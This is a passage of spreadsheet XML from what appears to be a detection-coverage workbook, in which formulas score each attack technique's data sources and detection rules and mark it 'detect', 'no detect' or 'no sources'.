        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O188" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P188" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S18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88" t="s">
        <v>1126</v>
      </c>
      <c r="U188" t="s">
        <v>1127</v>
      </c>
      <c r="V188" t="s">
        <v>1128</v>
      </c>
      <c r="W188" t="b">
        <v>1</v>
      </c>
      <c r="X188" t="s">
        <v>1116</v>
      </c>
    </row>
    <row r="189" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A189" t="s">
        <v>1116</v>
      </c>
      <c r="B189" t="s">
        <v>1129</v>
      </c>
      <c r="C189" t="s">
        <v>290</v>
      </c>
      <c r="D189" t="s">
        <v>7</v>
      </c>
      <c r="E189" t="s">
        <v>1121</v>
      </c>
      <c r="F189" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G189" s="9" cm="1">
        <f t="array" ref="G189">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H189" s="9" t="str" cm="1">
        <f t="array" ref="H189">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I189" s="9" t="str" cm="1">
        <f t="array" ref="I189">IF(SUM(IF($C189=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C189=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J189" s="9" t="str" cm="1">
        <f t="array" ref="J18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89" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M189" s="9" cm="1">
        <f t="array" ref="M189">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N189" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O189" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P189" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S18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89" t="s">
        <v>979</v>
      </c>
      <c r="U189" t="s">
        <v>1130</v>
      </c>
      <c r="V189" t="s">
        <v>1131</v>
      </c>
      <c r="W189" t="b">
        <v>1</v>
      </c>
      <c r="X189" t="s">
        <v>1116</v>
      </c>
    </row>
    <row r="190" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A190" t="s">
        <v>1116</v>
      </c>
      <c r="B190" t="s">
        <v>1132</v>
      </c>
      <c r="C190" t="s">
        <v>264</v>
      </c>
      <c r="D190" t="s">
        <v>7</v>
      </c>
      <c r="E190" t="s">
        <v>1121</v>
      </c>
      <c r="F190" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G190" s="9" cm="1">
        <f t="array" ref="G190">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H190" s="9" t="str" cm="1">
        <f t="array" ref="H190">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I190" s="9" t="str" cm="1">
        <f t="array" ref="I190">IF(SUM(IF($C190=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C190=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J190" s="9" t="str" cm="1">
        <f t="array" ref="J19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90" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M190" s="9" cm="1">
        <f t="array" ref="M190">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N190" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O190" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P190" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S19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90" t="s">
        <v>979</v>
      </c>
      <c r="U190" t="s">
        <v>1133</v>
      </c>
      <c r="V190" t="s">
        <v>1123</v>
      </c>
      <c r="W190" t="b">
        <v>1</v>
      </c>
      <c r="X190" t="s">
        <v>1116</v>
      </c>
    </row>
    <row r="191" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A191" t="s">
        <v>1134</v>
      </c>
      <c r="B191" t="s">
        <v>1134</v>
      </c>
      <c r="C191" t="s">
        <v>119</v>
      </c>
      <c r="D191" t="s">
        <v>7</v>
      </c>
      <c r="E191" t="s">
        <v>811</v>
      </c>
      <c r="F191" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G191" s="9" cm="1">
        <f t="array" ref="G191">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H191" s="9" cm="1">
        <f t="array" ref="H191">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I191" s="9" t="str" cm="1">
        <f t="array" ref="I191">IF(SUM(IF($C191=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C191=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J191" s="9" t="str" cm="1">
        <f t="array" ref="J19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91" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M191" s="9" cm="1">
        <f t="array" ref="M191">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N191" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O191" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P191" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S19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91" t="s">
        <v>368</v>
      </c>
      <c r="U191" t="s">
        <v>1135</v>
      </c>
      <c r="V191" t="s">
        <v>1136</v>
      </c>
      <c r="W191" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="192" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A192" t="s">
        <v>1137</v>
      </c>
      <c r="B192" t="s">
        <v>1137</v>
      </c>
      <c r="C192" t="s">
        <v>191</v>
      </c>
      <c r="D192" t="s">
        <v>6</v>
      </c>
      <c r="E192" t="s">
        <v>1138</v>
      </c>
      <c r="F192" s="9">
        <f t="shared" si="2"/>
        <v>7</v>
      </c>
      <c r="G192" s="9" cm="1">
        <f t="array" ref="G192">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H192" s="9" cm="1">
        <f t="array" ref="H192">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I192" s="9" t="str" cm="1">
        <f t="array" ref="I192">IF(SUM(IF($C192=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C192=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J192" s="9" t="str" cm="1">
        <f t="array" ref="J19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92" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M192" s="9" cm="1">
        <f t="array" ref="M192">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N192" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O192" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P192" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S19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92" t="s">
        <v>386</v>
      </c>
      <c r="U192" t="s">
        <v>1139</v>
      </c>
      <c r="V192" t="s">
        <v>1140</v>
      </c>
      <c r="W192" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="193" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A193" t="s">
        <v>1141</v>
      </c>
      <c r="B193" t="s">
        <v>1141</v>
      </c>
      <c r="C193" t="s">
        <v>174</v>
      </c>
      <c r="D193" t="s">
        <v>10</v>
      </c>
      <c r="E193" t="s">
        <v>467</v>
      </c>
      <c r="F193" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G193" s="9" cm="1">
        <f t="array" ref="G193">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H193" s="9" cm="1">
        <f t="array" ref="H193">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I193" s="9" t="str" cm="1">
        <f t="array" ref="I193">IF(SUM(IF($C193=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C193=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J193" s="9" t="str" cm="1">
        <f t="array" ref="J19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93" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M193" s="9" cm="1">
        <f t="array" ref="M193">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N193" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O193" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P193" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S19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93" t="s">
        <v>368</v>
      </c>
      <c r="U193" t="s">
        <v>1142</v>
      </c>
      <c r="V193" t="s">
        <v>1143</v>
      </c>
      <c r="W193" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="194" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A194" t="s">
        <v>1144</v>
      </c>
      <c r="B194" t="s">
        <v>1144</v>
      </c>
      <c r="C194" t="s">
        <v>162</v>
      </c>
      <c r="D194" t="s">
        <v>10</v>
      </c>
      <c r="E194" t="s">
        <v>1145</v>
      </c>
      <c r="F194" s="9">
        <f t="shared" ref="F194:F257" si="3">LEN(E194)-LEN(SUBSTITUTE(E194,",",""))+1</f>
        <v>5</v>
      </c>
      <c r="G194" s="9" cm="1">
        <f t="array" ref="G194">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H194" s="9" cm="1">
        <f t="array" ref="H194">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I194" s="9" t="str" cm="1">
        <f t="array" ref="I194">IF(SUM(IF($C194=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C194=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J194" s="9" cm="1">
        <f t="array" ref="J19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194" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M194" s="9" cm="1">
        <f t="array" ref="M194">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N194" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O194" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P194" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S19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94" t="s">
        <v>930</v>
      </c>
      <c r="U194" t="s">
        <v>1146</v>
      </c>
      <c r="V194" t="s">
        <v>1147</v>
      </c>
      <c r="W194" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="195" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A195" t="s">
        <v>1144</v>
      </c>
      <c r="B195" t="s">
        <v>1148</v>
      </c>
      <c r="C195" t="s">
        <v>1149</v>
      </c>
      <c r="D195" t="s">
        <v>10</v>
      </c>
      <c r="E195" t="s">
        <v>396</v>
      </c>
      <c r="F195" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G195" s="9" cm="1">
        <f t="array" ref="G195">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H195" s="9" t="str" cm="1">
        <f t="array" ref="H195">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I195" s="9" t="str" cm="1">
        <f t="array" ref="I195">IF(SUM(IF($C195=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C195=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J195" s="9" t="str" cm="1">
        <f t="array" ref="J19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95" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M195" s="9" cm="1">
        <f t="array" ref="M195">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N195" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O195" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P195" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S19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95" t="s">
        <v>386</v>
      </c>
      <c r="U195" t="s">
        <v>1150</v>
      </c>
      <c r="V195" t="s">
        <v>1151</v>
      </c>
      <c r="W195" t="b">
        <v>1</v>
      </c>
      <c r="X195" t="s">
        <v>1144</v>
      </c>
    </row>
    <row r="196" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A196" t="s">
        <v>1144</v>
      </c>
      <c r="B196" t="s">
        <v>1152</v>
      </c>
      <c r="C196" t="s">
        <v>306</v>
      </c>
      <c r="D196" t="s">
        <v>10</v>
      </c>
      <c r="E196" t="s">
        <v>1153</v>
      </c>
      <c r="F196" s="9">
        <f t="shared" si="3"/>
        <v>4</v>
      </c>
      <c r="G196" s="9" cm="1">
        <f t="array" ref="G196">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H196" s="9" t="str" cm="1">
        <f t="array" ref="H196">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I196" s="9" t="str" cm="1">
        <f t="array" ref="I196">IF(SUM(IF($C196=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C196=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J196" s="9" t="str" cm="1">
        <f t="array" ref="J19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96" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M196" s="9" cm="1">
        <f t="array" ref="M196">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N196" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O196" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P196" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S19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96" t="s">
        <v>1023</v>
      </c>
      <c r="U196" t="s">
        <v>1154</v>
      </c>
      <c r="V196" t="s">
        <v>1155</v>
      </c>
      <c r="W196" t="b">
        <v>1</v>
      </c>
      <c r="X196" t="s">
        <v>1144</v>
      </c>
    </row>
    <row r="197" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A197" t="s">
        <v>1144</v>
      </c>
      <c r="B197" t="s">
        <v>1156</v>
      </c>
      <c r="C197" t="s">
        <v>275</v>
      </c>
      <c r="D197" t="s">
        <v>10</v>
      </c>
      <c r="E197" t="s">
        <v>1157</v>
      </c>
      <c r="F197" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G197" s="9" cm="1">
        <f t="array" ref="G197">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H197" s="9" t="str" cm="1">
        <f t="array" ref="H197">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I197" s="9" t="str" cm="1">
        <f t="array" ref="I197">IF(SUM(IF($C197=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C197=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J197" s="9" t="str" cm="1">
        <f t="array" ref="J19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97" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M197" s="9" cm="1">
        <f t="array" ref="M197">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N197" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O197" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P197" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S19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97" t="s">
        <v>930</v>
      </c>
      <c r="U197" t="s">
        <v>1158</v>
      </c>
      <c r="V197" t="s">
        <v>1159</v>
      </c>
      <c r="W197" t="b">
        <v>1</v>
      </c>
      <c r="X197" t="s">
        <v>1144</v>
      </c>
    </row>
    <row r="198" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
